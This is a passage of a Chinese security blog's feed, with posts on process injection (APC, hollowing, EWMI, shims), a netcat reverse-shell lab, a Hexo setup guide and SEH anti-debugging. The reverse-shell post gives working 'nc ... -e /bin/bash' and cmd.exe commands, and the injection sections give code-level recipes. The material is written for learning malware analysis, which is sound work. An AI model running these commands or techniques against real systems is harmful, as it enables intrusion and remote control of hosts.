alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是一次关于InLine_HOOK的分析案例：</p><ul><li>在这里，先是利用App_Lnit技术加载了恶意的dll.以便后续的钩取。<br>  <img src="https://i.imgur.com/4ueB0FJ.png" alt=""></li><li>然后暂定线程，以便后续修改函数<br>  <img src="https://i.imgur.com/3G4idNi.png" alt=""></li><li>程序首先对进程进行快照，在快照列表中寻找符合要求的进程名，如果有则下一步<br>  <img src="https://i.imgur.com/lVkDgtl.png" alt=""></li><li>先获取当前的进程ID，然后把wsock32.dll和send函数作为参数压入。<br>  <img src="https://i.imgur.com/dBFrI8b.png" alt=""></li><li>如图，a2是钩取函数的地址，a2-ipAddress是为了获得两个进程的相对距离，-5是为了获得jmp xxxxxxxxx的大小，然后调用VirtuaProtect获得进程内存的权限。以便下面的修改，修改之后继续调用VirtaulProtect恢复进程原来状态<br>  <img src="https://i.imgur.com/AdGNXow.png" alt=""></li><li>最后恢复执行线程<br>  <img src="https://i.imgur.com/P2sPZU2.png" alt=""></li></ul><h1 id="第五部分：APC注入"><a href="#第五部分：APC注入" class="headerlink" title="第五部分：APC注入"></a>第五部分：APC注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链，他在线程处于可警告的等待状态时被执行。恶意代码为了使得自己立即被执行，他们会利用APC抢占处于等待状态的线程。</p><h2 id="用户模式下的APC注入"><a href="#用户模式下的APC注入" class="headerlink" title="用户模式下的APC注入"></a>用户模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序利用QueueUserAPC()函数调用远程函数，<strong>该函数的参数为pfnAPC,hThread,dwData,（1）目标线程的句柄; 2）指向恶意软件想要运行的函数指针; 3）和传递给函数指针的参数）。其要求hThread调用数值为dwData的pfnAPC定义的函数。</strong>当然线程处于等待状态是APC注入的前提，一般的注入svchost.exe，我们也可以调用SleepEx，SignalObjectAndWait，MsgWaitForMultipleObjectsEx，WaitForMultipleObjectsEx或WaitForSingleObjectEx函数，线程将进入可警醒状态。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwThreadId]</div><div class="line"><span class="keyword">push</span> <span class="number">0</span></div><div class="line"><span class="keyword">push</span> <span class="number">10h</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:OpenThread</div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">test</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line"><span class="keyword">jz</span> short Loc_401DCE</div><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwData]    <span class="comment">;dbnet.dll</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">esi</span>             <span class="comment">;hThread</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:LoadLibraryA <span class="comment">;pfnAPC</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:QueueUserAPC</div><div class="line"><span class="comment">;调用QueueUserAPC对pThread进程调用参数为dbnet.dll的LoadLibrary函数</span></div></pre></td></tr></table></figure></p><pre><code>![](https://i.imgur.com/Tb9YAz1.png)</code></pre><h2 id="内核模式下的APC注入"><a href="#内核模式下的APC注入" class="headerlink" title="内核模式下的APC注入"></a>内核模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用KeInitializeAPC()和KeInsertQueueAPC()进行APC注入。</p><h1 id="第六部分：进程替换技术-进程hollowing"><a href="#第六部分：进程替换技术-进程hollowing" class="headerlink" title="第六部分：进程替换技术(进程hollowing)"></a>第六部分：进程替换技术(进程hollowing)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了注入之外，我们还可以使用进程替换技术将一个可执行文件写入一个运行的进程内部，这种技术让恶意代码拥有和被替换进程相同的特权，<strong>这个技术关键是：需要以挂起状态创建进程，也就是说，这个进程将会被载入内存，但是主线程过去，在外部程序恢复主线程之前，程序不会工作，恢复主线程之后，程序工作。</strong>如下代码是进程替换代码的伪代码.该程序通过调用CreateProcess<strong>并将进程创建标志设置为CREATE_SUSPENDED（0x00000004）完成。新进程的主线程被创建为挂起状态，</strong>直到ResumeThread函数被调用才会运行。接下来，恶意软件需要用恶意的有效载荷来替换合法文件的内容。这可以通过调用ZwUnmapViewOfSection或NtUnmapViewOfSection来取消映射目标进程的内存。这两个API基本上释放了一个部分指向的所有内存。现在内存被取消映射，加载器执行VirtualAllocEx为恶意软件分配新内存，并使用WriteProcessMemory将每个恶意软件的部分写入目标进程空间。恶意软件调用SetThreadContext将entrypoint指向已编写的新代码段。最后，恶意软件通过调用ResumeThread来恢复挂起的线程。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcess</span><span class="params">(...,<span class="string">"目标进程.exe"</span>,CREATE_SUSPENDED)</span></span>；<span class="comment">//以挂起状态创建进程</span></div><div class="line"><span class="function"><span class="title">ZwUnmapviewOfSection</span><span class="params">()</span></span>                             <span class="comment">//释放内存，解除内存映射</span></div><div class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">()</span></span>                                   <span class="comment">//为恶意代码分配新空间</span></div><div class="line"><span class="function"><span class="title">writeProcessMenory</span><span class="params">(header)</span></span>                         <span class="comment">//写入数据（文件头）</span></div><div class="line"><span class="function"><span class="title">for</span><span class="params">(i=<span class="number">0</span>;i&lt;NumberOfSection;i++)</span></span></div><div class="line">WriteProcessMenory(section)                    <span class="comment">//写入节区数据</span></div><div class="line">···</div><div class="line"><span class="function"><span class="title">ResumeThread</span><span class="params">()</span></span>                                     <span class="comment">//重新启动主线程</span></div></pre></td></tr></table></figure></p><pre><code>![](https://i.imgur.com/Kv6WZ0V.png)</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有一个类似于进程hollowing的技术，叫做线程执行劫持。他针对进程中的现有线程，避免产生其他新的线程，先是查找线程，并且利用openThread打开目标线程，在获取目标线程的句柄后，恶意软件通过调用SuspendThread来将线程置于挂起模式。调用VirtualAllocEx和WriteProcessMemory来分配内存并执行代码注入的操作。然后调用GetThreadContext和GetThreadContext获取并设置线程的上下文，以将EIP寄存器设置到要执行恶意代码的地址，达到重启线程的作用。<br>    <img src="https://i.imgur.com/bTHGlVo.png" alt=""></p><h1 id="第七部分：PE注入"><a href="#第七部分：PE注入" class="headerlink" title="第七部分：PE注入"></a>第七部分：PE注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个技术类似于代码注入，但是与代码注入有所不同，更加像是把整个pe文件注入到进程，操作方法与进程替换的步骤又有所相像。这里暂时不做理会。</p><h1 id="第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI"><a href="#第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI" class="headerlink" title="第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)"></a>第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EWMI依靠注入资源管理器托盘窗口的额外窗口内存，并在恶意软件家族中被多次使用使用，如Gapz和PowerLoader。在注册窗口类时，应用程序可以指定一些额外的内存字节，称为额外的窗口存储器（EWM）。 然而，EWM并不算是块很充裕的空间。 为了规避这个限制，恶意软件将代码写入explorer.exe的共享部分，并使用SetWindowLong和SendNotifyMessage来指定一个指向shellcode的函数指针，然后执行它。当涉及到向共享部分的写入数据时，恶意软件有两个选择：它可以也创建一个共享空间，并将其映射到自身和另一个进程（例如，explorer.exe）；第二个选择就是简单地打开已经存在的共享部分。 前者具有分配堆空间和调用NTMapViewOfSection以及其他一些API调用的开销，因此后一种方法被更频繁地使用。 恶意软件在共享部分中写入其shellcode后，使用GetWindowLong和SetWindowLong访问并修改“Shell_TrayWnd”的额外窗口内存。 GetWindowLong是用于将指定偏移量的32位值检索到窗口类对象的额外窗口存储器中的API，SetWindowLong用于更改指定偏移量的值。 通过这样做，恶意软件可以简单地更改窗口类中的函数指针的偏移量，并将其指向写入共享部分的shellcode。像上面提到的大多数其他技术一样，恶意软件需要触发它编写的代码。 在以前讨论的技术中，恶意软件通过调用API（如CreateRemoteThread，QueueUserAPC或SetThreadContext）来实现这一点。 在EWMI方法中，恶意软件通过调用SendNotifyMessage触发注入的代码。 在执行SendNotifyMessage之后，Shell_TrayWnd接收并将控件传递给由SetWindowLong先前设置的值指向的地址。 在图13中，名为PowerLoader的恶意软件使用这种技术。 </p><h1 id="第九部分：SHIMS注入"><a href="#第九部分：SHIMS注入" class="headerlink" title="第九部分：SHIMS注入"></a>第九部分：SHIMS注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft向开发人员提供了Shims[译者注：Shim是一个工程术语，描述为了让两个物体更好地组装在一起而插入的一块木头或金属。在计算机编程中，shim是一个小型的函数库，用于透明地拦截API调用，修改传递的参数、自身处理操作、或把操作重定向到其他地方。Shim也可以用来在不同的软件平台上运行程序。]，主要是为了向后兼容。 Shims允许开发人员将修补程序应用于程序，而无需重写代码。 通过利用Shims，开发人员可以告诉操作系统如何处理其应用程序。 Shims本质上是一种嵌入API并针对特定可执行文件的方式。 恶意软件可以利用Shims来实现注入可执行文件并维持注入。 Windows运行Shim引擎时，它加载二进制文件以检查shimming数据库，以便应用适当的修补程序。有许多可以使用的修复程序，但是恶意软件还是更偏爱那些安全相关的（例如DisableNX，DisableSEH，InjectDLL等）。要安装shimming数据库，恶意软件可以使用各种方法。 例如，一个常见的方法是简单执行sdbinst.exe，并将其指向恶意的sdb文件。 在图14中，广告软件“Search Protect by Conduit”使用Shims进行注入和维持。 它在Google Chrome中执行“InjectDLL”shim以加载vc32loader.dll。 现在有一些用于分析sdb文件的工具，但是对于下面列出的sdb的分析，我使用了python-sdb，而没有使用现成的工具。 </p><h1 id="第十部分：说明"><a href="#第十部分：说明" class="headerlink" title="第十部分：说明"></a>第十部分：说明</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇博客，我主要参考的是逆向工程核心原理23.27.30-32等章节和恶意代码分析实战，以及来自看雪的一篇文章<a href="https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session" target="_blank" rel="external">https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session</a> Manager\AppCertDlls可能需要自己写入。因为AppCertDlls并不存在。<br>     <img src="https://i.imgur.com/O1rKkl5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第一部分：Rootkit技术&quot;&gt;&lt;a href=&quot;#第一部分：Rootkit技术&quot; class=&quot;headerlink&quot; title=&quot;第一部分：Rootkit技术&quot;&gt;&lt;/a&gt;第一部分：Rootkit技术&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用procexp能看到。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反向shell</title>
    <link href="http://yoursite.com/2018/02/02/%E5%8F%8D%E5%90%91shell%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/02/反向shell技术/</id>
    <published>2018-02-02T08:45:11.000Z</published>
    <updated>2018-02-09T16:50:29.491Z</updated>
    
    <content type="html"><![CDATA[<p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。</strong></p><h1 id="第一部分：反向shell介绍"><a href="#第一部分：反向shell介绍" class="headerlink" title="第一部分：反向shell介绍"></a>第一部分：反向shell介绍</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在这个模型中，一般的都是服务器对客户机发送请求。这个可以理解为正向的连接（正向shell），那么所谓的反向shell呢？反向shell是从被感染的机器中发起一个连接，他提供攻击者访问被感染机器的权限。现在主要流行两种反向shell的方法。第一种是<strong>netcat反向shell，</strong>还有一种是<strong>windows反向shell</strong>。<a id="more"></a></p><h1 id="第二部分：工具使用"><a href="#第二部分：工具使用" class="headerlink" title="第二部分：工具使用"></a>第二部分：工具使用</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用netcat反向shell需要使用的工具是netcat。在网络工具中有“瑞士军刀”美誉。<br><figure class="highlight plain"><figcaption><span>-p -e这三个参数</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-C               类似-L选项，一直不断连接[1.13版本新加的功能]</div><div class="line">-d               后台执行</div><div class="line">-e prog          程序重定向，一旦连接，就执行 [危险！！]</div><div class="line">-g gateway       源路由跳数,最大值为8(source-routing hop point[s],up to 8)</div><div class="line">-G num           源路由指针:4,8,12,... (source-routing pointer: 4,8,12,...)</div><div class="line">-h               帮助信息</div><div class="line">-i secs          延时的间隔</div><div class="line">-l               监听模式，用于入站连接</div><div class="line">-n               指定数字的IP地址，不能用hostname</div><div class="line">-o file          记录16进制的传输</div><div class="line">-p port          本地端口号</div><div class="line">-r               任意指定本地及远程端口</div><div class="line">-s addr          本地源地址</div><div class="line">-u               UDP模式,[netcat-1.15可以:远程nc -ulp port -e cmd.exe，本地nc -u ip port连接，得到一个shell.]</div><div class="line">-v               详细输出——用两个-v可得到更详细的内容</div><div class="line">-w secs          指定超时的时间</div><div class="line">-z               将输入输出关掉——用于扫描时</div></pre></td></tr></table></figure></p><h1 id="第三部分：利用netcat创建反向shell"><a href="#第三部分：利用netcat创建反向shell" class="headerlink" title="第三部分：利用netcat创建反向shell"></a>第三部分：利用netcat创建反向shell</h1><p>0.前提：利用虚拟机，攻击者是linux虚拟机，被攻击者是windows xp，linux的网络地址配置如下（等下要用），并将两台虚拟机都设置成主机模式。<br>     <img src="https://i.imgur.com/CCfyQLJ.png" alt=""></p><p>1.首先，我们在攻击者机器中设置一个监听，主要监听的是8888端口，我们监听的端口主要选择一些没有被使用过的端口，一般的1000多的端口都没有被使用。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc lvp <span class="number">8888</span></div></pre></td></tr></table></figure></p><p>2.在被攻击者机器中发送链接请求：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于Linux机器来说，使用一下命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc <span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span> <span class="number">8888</span> -e / bin / bash</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于windows机器来说，使用以下命令：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">nc</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.221</span><span class="selector-class">.129</span> 8888 <span class="selector-tag">-e</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span></div></pre></td></tr></table></figure></p><p>如图所示<br>    <img src="https://i.imgur.com/CsRYflh.png" alt=""></p><p>3.至此，我们在攻击者机器中就获得了与被攻击者同等权限的shell了，那么我们打开对我们被攻击者做出一些操作。就是反应有点慢。<br>    <img src="https://i.imgur.com/At9qTb9.png" alt=""></p><p>4.这个只是了解反向shell的基本原理，在实践中很难被利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;第一部分：反向shell介绍&quot;&gt;&lt;a href=&quot;#第一部分：反向shell介绍&quot; class=&quot;headerlink&quot; title=&quot;第一部分：反向shell介绍&quot;&gt;&lt;/a&gt;第一部分：反向shell介绍&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在这个模型中，一般的都是服务器对客户机发送请求。这个可以理解为正向的连接（正向shell），那么所谓的反向shell呢？反向shell是从被感染的机器中发起一个连接，他提供攻击者访问被感染机器的权限。现在主要流行两种反向shell的方法。第一种是&lt;strong&gt;netcat反向shell，&lt;/strong&gt;还有一种是&lt;strong&gt;windows反向shell&lt;/strong&gt;。
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>重新配置hexo博客</title>
    <link href="http://yoursite.com/2018/01/29/%E9%87%8D%E6%96%B0%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2018/01/29/重新配置hexo博客/</id>
    <published>2018-01-29T12:45:11.000Z</published>
    <updated>2018-01-29T10:18:06.745Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一步：下载Git和Node</strong></p><p><strong>第二歩：在桌面右键启动git 然后安装hexo:<br></strong><br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g hexo-<span class="keyword">cli</span></div></pre></td></tr></table></figure></p><a id="more"></a><p><strong>第三步：接着在文件夹里右键git，输入以下命令，然后在浏览器中输入localhost：4000看是否能本地预览</strong><br><br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo -s(或者hexo <span class="keyword">server</span>)</div></pre></td></tr></table></figure></p><p><strong>第四步：在Git下输入以下命令:(邮箱改成你的)</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh-keygen</span> <span class="selector-tag">-t</span> <span class="selector-tag">rsa</span> <span class="selector-tag">-C</span> "1434905079@<span class="keyword">qq</span>.<span class="keyword">com</span>"</div></pre></td></tr></table></figure></p><p><strong>第五步：打开 C:\Users\bxm09.ssh\id_rsa.pub，此文件里面内容为刚才生成的密钥，准确的复制这个文件的内容，粘贴到<a href="https://github.com/settings/ssh" target="_blank" rel="external">https://github.com/settings/ssh</a> 的 new SSH key 中</strong></p><p><strong>第六步：测试，输入以下命令：不要修改<br></strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-T</span> <span class="selector-tag">git</span>@<span class="keyword">github</span>.<span class="keyword">com</span></div></pre></td></tr></table></figure></p><p>得到以下反馈：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">The</span> <span class="selector-tag">authenticity</span> <span class="selector-tag">of</span> <span class="selector-tag">host</span> ‘<span class="selector-tag">github</span><span class="selector-class">.com</span> (<span class="number">207.97</span>.<span class="number">227.239</span>)’ <span class="selector-tag">can</span>’<span class="selector-tag">t</span> <span class="selector-tag">be</span> <span class="selector-tag">established</span>.</div><div class="line"><span class="selector-tag">RSA</span> <span class="selector-tag">key</span> <span class="selector-tag">fingerprint</span> <span class="selector-tag">is</span> <span class="selector-tag">16</span><span class="selector-pseudo">:27</span><span class="selector-pseudo">:ac</span><span class="selector-pseudo">:a5</span><span class="selector-pseudo">:76</span><span class="selector-pseudo">:28</span><span class="selector-pseudo">:2d</span><span class="selector-pseudo">:36</span><span class="selector-pseudo">:63</span><span class="selector-pseudo">:1b</span><span class="selector-pseudo">:56</span><span class="selector-pseudo">:4d</span><span class="selector-pseudo">:eb</span><span class="selector-pseudo">:df</span><span class="selector-pseudo">:a6</span><span class="selector-pseudo">:48.</span></div><div class="line"><span class="selector-tag">Are</span> <span class="selector-tag">you</span> <span class="selector-tag">sure</span> <span class="selector-tag">you</span> <span class="selector-tag">want</span> <span class="selector-tag">to</span> <span class="selector-tag">continue</span> <span class="selector-tag">connecting</span> (yes/no)?</div></pre></td></tr></table></figure></p><p>输入yes</p><p><strong>第七步：现在你已经可以通过 SSH 链接到 GitHub 了，还有一些个人信息需要完善的。Git 会根据用户的名字和邮箱来记录提交。GitHub 也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的。</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"findream"</span></div></pre></td></tr></table></figure></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"1434905079@qq.com"</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第一步：下载Git和Node&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二歩：在桌面右键启动git 然后安装hexo:&lt;br&gt;&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight avrasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install -g hexo-&lt;span class=&quot;keyword&quot;&gt;cli&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈SEH反调试技术</title>
    <link href="http://yoursite.com/2018/01/24/%E6%B5%85%E8%B0%88SEH%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/01/24/浅谈SEH技术/</id>
    <published>2018-01-24T13:20:11.000Z</published>
    <updated>2018-02-20T07:26:20.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>SEH(“Structured Exception Handling”),即结构化异常处理·是(windows)操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。它不依托于设计语言，只依托于操作系统，这些并不是编译程序本身所固有的,本质上只不过是对windows内在提供的结构化异常处理的包装。</strong><br><strong>参看资料：</strong><br><strong>1.逆向工程核心原理</strong><br><strong>2.<a href="https://www.52pojie.cn/thread-16609-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-16609-1-1.html</a></strong><br><strong>3.<a href="https://bbs.pediy.com/thread-27224.html" target="_blank" rel="external">https://bbs.pediy.com/thread-27224.html</a></strong><br><strong>4.<a href="https://bbs.pediy.com/thread-12449.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-12449.htm</a></strong><br><strong>5.<a href="https://bbs.pediy.com/thread-189193.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-189193.htm</a></strong><br><a id="more"></a></p><h1 id="第一部分：windows系统的几种常见的异常"><a href="#第一部分：windows系统的几种常见的异常" class="headerlink" title="第一部分：windows系统的几种常见的异常"></a>第一部分：windows系统的几种常见的异常</h1><ul><li>异常：<ul><li>1）内存非法访问异常（Exception_Access_Violation）<ul><li>1.1) MOV DS:[0],123   —0号区域未被分配</li><li>1.2) MOV DS:[40100],123  —.test节区起始地址只有读取权限</li><li>1.3）MOV DS:[80000],123  —内核区域</li><li>1.4）说明：0号地址虽然属于用户区域但是，该地址没有被分配。</li></ul></li><li>2）断点异常（Exception_BreakPoint）<ul><li>2.1）软件断点    —int 3</li><li>2.2）硬件断点    —对某一个地址下断点</li></ul></li><li>3）CPU无法解析异常（Exception_Illegal_Instruction）<ul><li>3.1)某一个指令集不在cpu解析的指令之中</li></ul></li><li>4）除0异常</li><li>5）单步异常</li></ul></li></ul><h1 id="第二部分：SEH介绍"><a href="#第二部分：SEH介绍" class="headerlink" title="第二部分：SEH介绍"></a>第二部分：SEH介绍</h1><p><strong>1.SEH链：SEH是以链状形式存在，如果异常没有被第一个异常处理函数处理，那么就会传递给下一个异常处理函数。</strong><br>    <img src="https://i.imgur.com/qiZyz0w.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">typedef struct _Exception_SEH_List</div><div class="line">&#123;</div><div class="line">PException_SEH *next;    //*next指针指向下一个节点，</div><div class="line">PException_DISPOSITION handle;    //handle指向一个异常处理函数。</div><div class="line">&#125;_Exception_SEH_List,*_Exception_SEH_List;</div></pre></td></tr></table></figure></p><p>*next指针指向下一个节点，handle指向一个异常处理函数。<br>    <img src="https://i.imgur.com/KHhEkKj.png" alt=""></p><p><strong>2.异常处理函数：异常处理函数是一个回调函数，接收4个参数，返回值是一个枚举类型。</strong><br>    <img src="https://i.imgur.com/lF0vRfL.png" alt=""></p><ul><li>四个参数：<ul><li>1）Exception_Recode *pRecode:该参数是一个指向_Exception_Recode结构体的指针。该结构体包含关于异常的类型和地址等重要信息。<br><img src="https://i.imgur.com/vJdqVsF.png" alt=""></li><li>2）Exception_Register_Recode *pFrame:不重要</li><li>3）CONTEXT *pContext:对于IA-32 来说有效，保存CPU处理异常前的状态。</li><li>4）PVOID *pViod:保留应该为1<br><img src="https://i.imgur.com/1y36Gh1.png" alt=""></li></ul></li><li>1个返回值：处理成功返回0，否则返回1</li></ul><p><strong>3.SEH的入口地址：在TEB.NtTib.ExceptionList,对应的段寄存器地址是FS:[0].</strong></p><h1 id="第三部分：SEH反调试基础："><a href="#第三部分：SEH反调试基础：" class="headerlink" title="第三部分：SEH反调试基础："></a>第三部分：SEH反调试基础：</h1><p><strong>1.首先利用异常处理例程来进行反跟踪</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很多CM都是首先安装好一个异常处理例程，<strong>然后故意制造一个异常</strong>,然后程序抛出异常.ollydebug下用shift + F7 或者 shift + F8进ntdll.KiUserExceptionDispatcher,单步跟踪后最后系统调用用户模块中的异常处理例程. 很多CM都是在异常处理例程编写一个算法来重新将EIP定位到一个会造成异常的指令地址，重复这个过程几次，这样给调试者一种很难跟踪的假象，这种一般只要用 shift + F9 (OllyDebug:该组合键是将异常交给用户程序的异常处理例程来处理),如果我们想弄清楚异常处理例程到底在做什么，我们可以在异常处理例程下个断点来查看其实现过程。<br>    <img src="https://i.imgur.com/H9gbcVy.png" alt=""><br>    <img src="https://i.imgur.com/DiXU43I.png" alt=""></p><p><strong>2.未处理异常用于反跟踪的原理:</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据MSDN的描述,UnhandledExceptionFilter在没有debugger attach的时候才会被调用。所以，SetUnhandledExceptionFilter函数还有一个妙用，就是让某些敏感代码避开debugger的追踪。比如你想把一些代码保护起来，避免调试器的追踪，可以采用的方法：<strong>把代码放到SetUnhandledExceptionFilter设定的函数里面。通过人为触发一个unhandled exception来执行。<font 